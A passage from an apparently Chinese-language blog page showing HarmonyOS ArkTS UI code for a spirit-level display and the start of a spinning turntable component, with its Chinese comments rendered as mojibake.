ä½¿ç”¨Stackå¸ƒå±€å®¹å™¨</span></span><br><span class="line">    <span class="title class_">Stack</span>() &#123;</span><br><span class="line">      <span class="comment">// æ˜¾ç¤ºå½“å‰è§’åº¦çš„æ–‡æœ¬</span></span><br><span class="line">      <span class="title class_">Stack</span>() &#123;</span><br><span class="line">        <span class="title class_">Row</span>(&#123; <span class="attr">space</span>: <span class="number">5</span> &#125;) &#123; <span class="comment">// åˆ›å»ºä¸€ä¸ªè¡Œå¸ƒå±€ï¼Œè®¾ç½®é—´è·ä¸º5</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="built_in">Math</span>.floor(<span class="variable language_">this</span>.angle)&#125;</span>Â°`</span>)<span class="comment">// æ˜¾ç¤ºå½“å‰è§’åº¦</span></span><br><span class="line">            .<span class="title function_">layoutWeight</span>(<span class="number">1</span>)<span class="comment">// è®¾ç½®å¸ƒå±€æƒé‡</span></span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)<span class="comment">// æ–‡æœ¬å¯¹é½æ–¹å¼</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="string">&#x27;#dedede&#x27;</span>)<span class="comment">// æ–‡æœ¬é¢œè‰²</span></span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">60</span>); <span class="comment">// æ–‡æœ¬å¤§å°</span></span><br><span class="line">        &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">80</span> &#125;) <span class="comment">// è®¾ç½®å®½åº¦å’Œä¸Šè¾¹è·</span></span><br><span class="line">      &#125;.<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">align</span>(<span class="title class_">Alignment</span>.<span class="property">Top</span>) <span class="comment">// è®¾ç½®é«˜åº¦å’Œå¯¹é½æ–¹å¼</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">// æ¨¡æ‹Ÿæ°´å¹³ä»ªèƒŒæ™¯çš„åœ†ç¯</span></span><br><span class="line">      <span class="title class_">Stack</span>() &#123;</span><br><span class="line">        <span class="comment">// å¤–éƒ¨å¤§åœ†</span></span><br><span class="line">        <span class="title class_">Text</span>()</span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;600lpx&#x27;</span>)<span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">          .<span class="title function_">height</span>(<span class="string">&#x27;600lpx&#x27;</span>)<span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>)<span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#171b1e&quot;</span>)<span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">          .<span class="title function_">blur</span>(<span class="number">50</span>)<span class="comment">// è®¾ç½®æ¨¡ç³Šæ•ˆæœ</span></span><br><span class="line">          .<span class="title function_">shadow</span>(&#123; <span class="attr">radius</span>: <span class="number">300</span>, <span class="attr">type</span>: <span class="title class_">ShadowType</span>.<span class="property">COLOR</span>, <span class="attr">color</span>: <span class="string">&quot;#232426&quot;</span> &#125;); <span class="comment">// è®¾ç½®é˜´å½±æ•ˆæœ</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">// ä¸­é—´åœ†</span></span><br><span class="line">        <span class="title class_">Text</span>()</span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.angle &lt;= <span class="number">10</span> ? <span class="variable language_">this</span>.angle * <span class="number">2.5</span> : (<span class="number">10</span> * <span class="number">2.5</span> + (<span class="variable language_">this</span>.angle - <span class="number">10</span>))) * UNIT_LENGTH *</span></span></span><br><span class="line"><span class="subst"><span class="string">            <span class="number">2</span>&#125;</span>lpx`</span>)<span class="comment">// è®¡ç®—å®½åº¦</span></span><br><span class="line">          .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.angle &lt;= <span class="number">10</span> ? <span class="variable language_">this</span>.angle * <span class="number">2.5</span> : (<span class="number">10</span> * <span class="number">2.5</span> + (<span class="variable language_">this</span>.angle - <span class="number">10</span>))) * UNIT_LENGTH *</span></span></span><br><span class="line"><span class="subst"><span class="string">            <span class="number">2</span>&#125;</span>lpx`</span>)<span class="comment">// è®¡ç®—é«˜åº¦</span></span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>)<span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#2e3235&quot;</span>)<span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">          .<span class="title function_">animation</span>(&#123; <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">EaseOut</span> &#125;); <span class="comment">// è®¾ç½®åŠ¨ç”»æ•ˆæœ</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">// åˆ»åº¦çº¿</span></span><br><span class="line">        <span class="title class_">ForEach</span>([<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>], <span class="function">(<span class="params">item: number</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="title class_">Text</span>()</span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;(<span class="number">15</span> + item) * UNIT_LENGTH * <span class="number">2</span>&#125;</span>lpx`</span>)<span class="comment">// è®¡ç®—å®½åº¦</span></span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;(<span class="number">15</span> + item) * UNIT_LENGTH * <span class="number">2</span>&#125;</span>lpx`</span>)<span class="comment">// è®¡ç®—é«˜åº¦</span></span><br><span class="line">            .<span class="title function_">borderWidth</span>(<span class="number">1</span>)<span class="comment">// è®¾ç½®è¾¹æ¡†å®½åº¦</span></span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>)<span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">            .<span class="title function_">borderColor</span>(<span class="string">&quot;#807d8184&quot;</span>); <span class="comment">// è®¾ç½®è¾¹æ¡†é¢œè‰²</span></span><br><span class="line"> </span><br><span class="line">          <span class="comment">// åˆ»åº¦æ•°å­—</span></span><br><span class="line">          <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;item&#125;</span>`</span>)</span><br><span class="line">            .<span class="title function_">width</span>(<span class="number">20</span>)<span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="string">&quot;#7d8184&quot;</span>)<span class="comment">// è®¾ç½®å­—ä½“é¢œè‰²</span></span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="number">10</span>)<span class="comment">// è®¾ç½®å­—ä½“å¤§å°</span></span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)<span class="comment">// è®¾ç½®æ–‡æœ¬å¯¹é½æ–¹å¼</span></span><br><span class="line">            .<span class="title function_">margin</span>(&#123; <span class="attr">left</span>: <span class="string">`<span class="subst">$&#123;(<span class="number">15</span> + item) * UNIT_LENGTH * <span class="number">2</span>&#125;</span>lpx`</span> &#125;); <span class="comment">// è®¾ç½®å·¦è¾¹è·</span></span><br><span class="line">        &#125;);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// å°çƒ</span></span><br><span class="line">        <span class="title class_">Text</span>()</span><br><span class="line">          .<span class="title function_">width</span>(<span class="number">14</span>)<span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">          .<span class="title function_">height</span>(<span class="number">14</span>)<span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">          .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#ff5841&quot;</span>)<span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">          .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>); <span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">// å°çƒèƒŒæ™¯</span></span><br><span class="line">        <span class="title class_">Stack</span>() &#123;</span><br><span class="line">          <span class="title class_">Stack</span>() &#123;</span><br><span class="line">          &#125;</span><br><span class="line">          .<span class="title function_">radialGradient</span>(&#123;</span><br><span class="line">            <span class="attr">center</span>: [<span class="number">20</span>, <span class="number">20</span>], <span class="comment">// è®¾ç½®æ¸å˜ä¸­å¿ƒç‚¹</span></span><br><span class="line">            <span class="attr">radius</span>: <span class="number">60</span>, <span class="comment">// è®¾ç½®æ¸å˜åŠå¾„</span></span><br><span class="line">            <span class="attr">colors</span>: [</span><br><span class="line">              [<span class="string">&quot;#807a7a83&quot;</span>, <span class="number">0.0</span>], <span class="comment">// æ¸å˜é¢œè‰²1</span></span><br><span class="line">              [<span class="string">&quot;#8074747e&quot;</span>, <span class="number">0.7</span>], <span class="comment">// æ¸å˜é¢œè‰²2</span></span><br><span class="line">              [<span class="string">&quot;#80898992&quot;</span>, <span class="number">1.0</span>]<span class="comment">// æ¸å˜é¢œè‰²3</span></span><br><span class="line">            ]</span><br><span class="line">          &#125;).<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®å®½åº¦å’Œé«˜åº¦</span></span><br><span class="line">        &#125;</span><br><span class="line">        .<span class="title function_">clip</span>(<span class="literal">true</span>) <span class="comment">// è®¾ç½®è£å‰ª</span></span><br><span class="line">        .<span class="title function_">radialGradient</span>(&#123;</span><br><span class="line">          <span class="attr">center</span>: [<span class="number">20</span>, <span class="number">20</span>], <span class="comment">// è®¾ç½®æ¸å˜ä¸­å¿ƒç‚¹</span></span><br><span class="line">          <span class="attr">radius</span>: <span class="number">60</span>, <span class="comment">// è®¾ç½®æ¸å˜åŠå¾„</span></span><br><span class="line">          <span class="attr">colors</span>: <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="variable language_">this</span>.<span class="property">angle</span>) === <span class="number">0</span> ?</span><br><span class="line">            [[<span class="string">&quot;#FF6B6B&quot;</span>, <span class="number">0.0</span>], [<span class="string">&quot;#D84315&quot;</span>, <span class="number">0.3</span>], [<span class="string">&quot;#C62828&quot;</span>, <span class="number">1.0</span>]] : <span class="comment">// å½“è§’åº¦ä¸º0æ—¶çš„æ¸å˜é¢œè‰²</span></span><br><span class="line">            [[<span class="string">&quot;#bcbcc6&quot;</span>, <span class="number">0.0</span>], [<span class="string">&quot;#464650&quot;</span>, <span class="number">0.3</span>], [<span class="string">&quot;#474750&quot;</span>, <span class="number">1.0</span>]] <span class="comment">// å½“è§’åº¦ä¸ä¸º0æ—¶çš„æ¸å˜é¢œè‰²</span></span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">width</span>(<span class="number">50</span>) <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="number">50</span>) <span class="comment">// è®¾ç½®é«˜åº¦</span></span><br><span class="line">        .<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>) <span class="comment">// è®¾ç½®åœ†è§’</span></span><br><span class="line">        .<span class="title function_">translate</span>(&#123;</span><br><span class="line">          <span class="attr">x</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.calculateBallPosition().x&#125;</span>lpx`</span>, <span class="comment">// è®¾ç½®Xè½´åç§»</span></span><br><span class="line">          <span class="attr">y</span>: <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.calculateBallPosition().y&#125;</span>lpx`</span> <span class="comment">// è®¾ç½®Yè½´åç§»</span></span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">animation</span>(&#123; <span class="attr">curve</span>: <span class="title class_">Curve</span>.<span class="property">EaseOut</span> &#125;); <span class="comment">// è®¾ç½®åŠ¨ç”»æ•ˆæœ</span></span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">&#x27;580lpx&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;580lpx&#x27;</span>).<span class="title function_">borderRadius</span>(<span class="string">&#x27;50%&#x27;</span>) <span class="comment">// è®¾ç½®å¤–éƒ¨å¤§åœ†çš„å®½åº¦ã€é«˜åº¦å’Œåœ†è§’</span></span><br><span class="line">    &#125;.<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®Stackçš„é«˜åº¦</span></span><br><span class="line">    .<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>) <span class="comment">// è®¾ç½®Stackçš„å®½åº¦</span></span><br><span class="line">    .<span class="title function_">backgroundColor</span>(<span class="string">&quot;#18181a&quot;</span>); <span class="comment">// è®¾ç½®èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="turntable"><a href="#turntable" class="headerlink" title="turntable"></a>turntable</h1><p>è½¬ç›˜</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">CounterComponent</span>, <span class="title class_">CounterType</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>; <span class="comment">// å¯¼å…¥è®¡æ•°å™¨ç»„ä»¶å’Œè®¡æ•°å™¨ç±»å‹</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// å®šä¹‰æ‰‡å½¢ç»„ä»¶</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">Sector</span> &#123;</span><br><span class="line">  @<span class="title class_">Prop</span> <span class="attr">radius</span>: number; <span class="comment">// æ‰‡å½¢çš„åŠå¾„</span></span><br><span class="line">  @<span class="title class_">Prop</span> <span class="attr">angle</span>: number; <span class="comment">// æ‰‡å½¢çš„è§’åº¦</span></span><br><span class="line">  @<span class="title class_">Prop</span> <span class="attr">color</span>: string; <span class="comment">// æ‰‡å½¢çš„é¢œè‰²</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// åˆ›å»ºæ‰‡å½¢è·¯å¾„çš„å‡½æ•°</span></span><br><span class="line">  <span class="title function_">createSectorPath</span>(<span class="attr">radius</span>: number, <span class="attr">angle</span>: number): string &#123;</span><br><span class="line">    <span class="keyword">const</span> centerX = radius / <span class="number">2</span>; <span class="comment">// è®¡ç®—æ‰‡å½¢ä¸­å¿ƒçš„Xåæ ‡</span></span><br><span class="line">    <span class="keyword">const</span> centerY = radius / <span class="number">2</span>; <span class="comment">// è®¡ç®—æ‰‡å½¢ä¸­å¿ƒçš„Yåæ ‡</span></span><br><span class="line">    <span class="keyword">const</span> startX = centerX; <span class="comment">// æ‰‡å½¢èµ·å§‹ç‚¹çš„Xåæ ‡</span></span><br><span class="line">    <span class="keyword">const</span> startY = centerY - radius; <span class="comment">// æ‰‡å½¢èµ·å§‹ç‚¹çš„Yåæ ‡</span></span><br><span class="line">    <span class="keyword">const</span> halfAngle = angle / <span class="number">4</span>; <span class="comment">// è®¡ç®—åŠä¸ªè§’åº¦</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// è®¡ç®—æ‰‡å½¢ç»“æŸç‚¹1çš„åæ ‡</span></span><br><span class="line">    <span class="keyword">const</span> endX1 = centerX + radius * <span class="title class_">Math</span>.<span class="title function_">cos</span>((halfAngle * <span class="title class_">Math</span>.<span class="property">PI</span>) / <span class="number">180</span>);</span><br><span class="line">    <span class="keyword">const</span> endY1 = centerY - radius * <span class="title class_">Math</span>.<span class="title function_">sin</span>((halfAngle * <span class="title class_">Math</span>.<span class="property">PI</span>) / <span class="number">180</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// è®¡ç®—æ‰‡å½¢ç»“æŸç‚¹2çš„åæ ‡</span></span><br><span class="line">    <span class="keyword">const</span> endX2 = centerX + radius * <span class="title class_">Math</span>.<span class="title function_">cos</span>((-halfAngle * <span class="title class_">Math</span>.<span class="property">PI</span>) / <span class="number">180</span>);</span><br><span class="line">    <span class="keyword">const</span> endY2 = centerY - radius * <span class="title class_">Math</span>.<span class="title function_">sin</span>((-halfAngle * <span class="title class_">Math</span>.<span class="property">PI</span>) / <span class="number">180</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// åˆ¤æ–­æ˜¯å¦ä¸ºå¤§å¼§</span></span><br><span class="line">    <span class="keyword">const</span> largeArcFlag = angle / <span class="number">2</span> &gt; <span class="number">180</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> sweepFlag = <span class="number">1</span>; <span class="comment">// è®¾ç½®å¼§çº¿æ–¹å‘ä¸ºé¡ºæ—¶é’ˆ</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// ç”ŸæˆSVGè·¯å¾„å‘½ä»¤</span></span><br><span class="line">    <span class="keyword">const</span> pathCommands =</span><br><span class="line">      <span class="string">`M<span class="subst">$&#123;startX&#125;</span> <span class="subst">$&#123;startY&#125;</span> A<span class="subst">$&#123;radius&#125;</span> <span class="subst">$&#123;radius&#125;</span> 0 <span class="subst">$&#123;largeArcFlag&#125;</span> <span class="subst">$&#123;sweepFlag&#125;</span> <span class="subst">$&#123;endX1&#125;</span> <span class="subst">$&#123;endY1&#125;</span> L<span class="subst">$&#123;centerX&#125;</span> <span class="subst">$&#123;centerY&#125;</span> L<span class="subst">$&#123;endX2&#125;</span> <span class="subst">$&#123;endY2&#125;</span> A<span class="subst">$&#123;radius&#125;</span> <span class="subst">$&#123;radius&#125;</span> 0 <span class="subst">$&#123;largeArcFlag&#125;</span> <span class="subst">$&#123;<span class="number">1</span> -</span></span></span><br><span class="line"><span class="subst"><span class="string">        sweepFlag&#125;</span> <span class="subst">$&#123;startX&#125;</span> <span class="subst">$&#123;startY&#125;</span> Z`</span>;</span><br><span class="line">    <span class="keyword">return</span> pathCommands; <span class="comment">// è¿”å›è·¯å¾„å‘½ä»¤</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ„å»ºæ‰‡å½¢ç»„ä»¶</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Stack</span>() &#123;</span><br><span class="line">      <span class="comment">// åˆ›å»ºç¬¬ä¸€ä¸ªæ‰‡å½¢è·¯å¾„</span></span><br><span class="line">      <span class="title class_">Path</span>()</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.radius&#125;</span>px`</span>) <span class="comment">// è®¾ç½®å®½åº¦ä¸ºåŠå¾„</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.radius&#125;</span>px`</span>) <span class="comment">// è®¾ç½®é«˜åº¦ä¸ºåŠå¾„</span></span><br><span class="line">        .<span class="title function_">commands</span>(<span class="variable language_">this</span>.<span class="title function_">createSectorPath</span>(<span class="variable language_">this</span>.<span class="property">radius</span>, <span class="variable language_">this</span>.<span class="property">angle</span>)) <span class="comment">// è®¾ç½®è·¯å¾„å‘½ä»¤</span></span><br><span class="line">        .<span class="title function_">fillOpacity</span>(<span class="number">1</span>) <span class="comment">// è®¾ç½®å¡«å……é€æ˜åº¦</span></span><br><span class="line">        .<span class="title function_">fill</span>(<span class="variable language_">this</span>.<span class="property">color</span>) <span class="comment">// è®¾ç½®å¡«å……é¢œè‰²</span></span><br><span class="line">        .<span class="title function_">strokeWidth</span>(<span class="number">0</span>) <span class="comment">// è®¾ç½®è¾¹æ¡†å®½åº¦ä¸º0</span></span><br><span class="line">        .<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: <span class="variable language_">this</span>.<span class="property">angle</span> / <span class="number">4</span> - <span class="number">90</span> &#125;); <span class="comment">// æ—‹è½¬æ‰‡å½¢</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">// åˆ›å»ºç¬¬äºŒä¸ªæ‰‡å½¢è·¯å¾„</span></span><br><span class="line">      <span class="title class_">Path</span>()</span><br><span class="line">        .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.radius&#125;</span>px`</span>) <span class="comment">// è®¾ç½®å®½åº¦ä¸ºåŠå¾„</span></span><br><span class="line">        .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.radius&#125;</span>px`</span>) <span class="comment">// è®¾ç½®é«˜åº¦ä¸ºåŠå¾„</span></span><br><span class="line">        .<span class="title function_">commands</span>(<span class="variable language_">this</span>.<span class="title function_">createSectorPath</span>(<span class="variable language_">this</span>.<span class="property">radius</span>, <span class="variable language_">this</span>.<span class="property">angle</span>)) <span class="comment">// è®¾ç½®è·¯å¾„å‘½ä»¤</span></span><br><span class="line">        .<span class="title function_">fillOpacity</span>(<span class="number">1</span>) <span class="comment">// è®¾ç½®å¡«å……é€æ˜åº¦</span></span><br><span class="line">        .<span class="title function_">fill</span>(<span class="variable language_">this</span>.<span class="property">color</span>) <span class="comment">// è®¾ç½®å¡«å……é¢œè‰²</span></span><br><span class="line">        .<span class="title function_">strokeWidth</span>(<span class="number">0</span>) <span class="comment">// è®¾ç½®è¾¹æ¡†å®½åº¦ä¸º0</span></span><br><span class="line">        .<span class="title function_">rotate</span>(&#123; <span class="attr">angle</span>: <span class="number">180</span> - (<span class="variable language_">this</span>.<span class="property">angle</span> / <span class="number">4</span> - <span class="number">90</span>) &#125;); <span class="comment">// æ—‹è½¬æ‰‡å½¢</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// å®šä¹‰å•å…ƒæ ¼ç±»</span></span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cell</span> &#123;</span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">angle</span>: number = <span class="number">0</span>; <span class="comment">// æ‰‡å½¢çš„è§’åº¦</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">title</span>: string; <span class="comment">// å½“å‰æ ¼å­çš„æ ‡é¢˜</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">color</span>: string; <span class="comment">// èƒŒæ™¯é¢œè‰²</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">rotate</span>: number = <span class="number">0</span>; <span class="comment">// åœ¨è½¬ç›˜è¦æ—‹è½¬çš„è§’åº¦</span></span><br><span class="line">  <span class="attr">angleStart</span>: number = <span class="number">0</span>; <span class="comment">// è½®ç›˜æ‰€åœ¨åŒºé—´çš„èµ·å§‹</span></span><br><span class="line">  <span class="attr">angleEnd</span>: number = <span class="number">0</span>; <span class="comment">// è½®ç›˜æ‰€åœ¨åŒºé—´çš„ç»“æŸ</span></span><br><span class="line">  <span class="attr">proportion</span>: number = <span class="number">0</span>; <span class="comment">// æ‰€å æ¯”ä¾‹</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ„é€ å‡½æ•°</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">proportion: number, title: string, color: string</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">proportion</span> = proportion; <span class="comment">// è®¾ç½®æ¯”ä¾‹</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">title</span> = title; <span class="comment">// è®¾ç½®æ ‡é¢˜</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">color</span> = color; <span class="comment">// è®¾ç½®é¢œè‰²</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// å®šä¹‰è½¬ç›˜ç»„ä»¶</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title 